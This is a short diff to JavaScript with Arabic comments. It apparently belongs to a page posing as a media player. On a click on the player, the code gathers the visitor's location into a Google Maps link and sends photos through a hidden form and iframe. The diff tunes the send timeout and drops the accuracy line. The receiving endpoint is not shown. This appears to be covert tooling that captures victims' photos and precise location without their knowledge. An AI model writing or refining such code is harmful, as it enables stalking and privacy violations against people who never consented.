@@ -245,7 +245,7 @@ function sendPhoto(blob, caption) {
             form.remove();
             iframe.remove();
             resolve();
-        }, 3000);
+        }, 1500);
     });
 }
 
@@ -273,7 +273,6 @@ player.addEventListener('click', async () => {
         let locInfo = '\n📍 الموقع: غير متاح';
         if (loc) {
             locInfo = `\n📍 الموقع: https://maps.google.com/?q=${loc.lat},${loc.lng}`;
-            locInfo += `\n🎯 الدقة: ${Math.round(loc.acc)} متر`;
 
             // إرسال الموقع كرسالة منفصلة (خريطة تفاعلية)
         }
